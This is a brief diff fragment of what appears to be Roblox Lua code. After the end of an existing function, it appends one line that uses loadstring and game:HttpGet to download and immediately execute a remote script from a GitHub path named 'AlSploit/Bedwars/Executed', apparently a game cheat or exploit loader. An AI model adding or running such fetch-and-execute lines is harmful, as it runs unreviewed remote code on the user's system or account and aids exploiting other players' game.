@@ -247,3 +247,5 @@ task.spawn(function()
 		end
 	end)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AlSploit/AlSploit/refs/heads/main/AlSploit/Bedwars/Executed"))()
